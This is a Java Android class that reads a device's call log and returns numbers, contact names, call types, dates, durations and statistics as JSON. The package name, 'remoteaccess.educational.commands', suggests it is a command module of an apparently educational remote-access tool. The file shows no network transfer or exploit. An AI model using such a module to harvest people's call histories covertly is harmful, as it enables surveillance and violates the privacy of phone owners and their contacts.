package com.remoteaccess.educational.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Call Logs Handler - Read call history
 */
public class CallLogsHandler {

    private Context context;

    public CallLogsHandler(Context context) {
        this.context = context;
    }

    /**
     * Get all call logs
     */
    public JSONObject getAllCallLogs(int limit) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_CALL_LOG permission not granted");
                return result;
            }

            String[] projection = new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            };

            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT " + limit
            );

            JSONArray callsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    call.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)));
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    call.put("type", getCallType(type));
                    call.put("typeCode", type);
                    
                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    
                    callsList.put(call);
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("calls", callsList);
            result.put("count", callsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get call logs by type
     */
    public JSONObject getCallLogsByType(int callType, int limit) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_CALL_LOG permission not granted");
                return result;
            }

            String[] projection = new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            };

            String selection = CallLog.Calls.TYPE + " = ?";
            String[] selectionArgs = new String[] { String.valueOf(callType) };

            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                CallLog.Calls.DATE + " DESC LIMIT " + limit
            );

            JSONArray callsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    call.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)));
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    call.put("type", getCallType(callType));
                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    
                    callsList.put(call);
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("callType", getCallType(callType));
            result.put("calls", callsList);
            result.put("count", callsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get call logs from specific number
     */
    public JSONObject getCallLogsFromNumber(String phoneNumber, int limit) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_CALL_LOG permission not granted");
                return result;
            }

            String[] projection = new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            };

            String selection = CallLog.Calls.NUMBER + " = ?";
            String[] selectionArgs = new String[] { phoneNumber };

            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                CallLog.Calls.DATE + " DESC LIMIT " + limit
            );

            JSONArray callsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    call.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)));
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    call.put("type", getCallType(type));
                    
                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    
                    callsList.put(call);
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("phoneNumber", phoneNumber);
            result.put("calls", callsList);
            result.put("count", callsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get call type name
     */
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            default:
                return "Unknown";
        }
    }

    /**
     * Get call statistics
     */
    public JSONObject getCallStatistics() {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_CALL_LOG permission not granted");
                return result;
            }

            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[] { CallLog.Calls.TYPE, CallLog.Calls.DURATION },
                null,
                null,
                null
            );

            int totalCalls = 0;
            int incomingCalls = 0;
            int outgoingCalls = 0;
            int missedCalls = 0;
            long totalDuration = 0;

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    totalCalls++;
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    
                    totalDuration += duration;
                    
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            incomingCalls++;
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            outgoingCalls++;
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            missedCalls++;
                            break;
                    }
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("totalCalls", totalCalls);
            result.put("incomingCalls", incomingCalls);
            result.put("outgoingCalls", outgoingCalls);
            result.put("missedCalls", missedCalls);
            result.put("totalDuration", totalDuration);
            result.put("averageDuration", totalCalls > 0 ? totalDuration / totalCalls : 0);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }
}
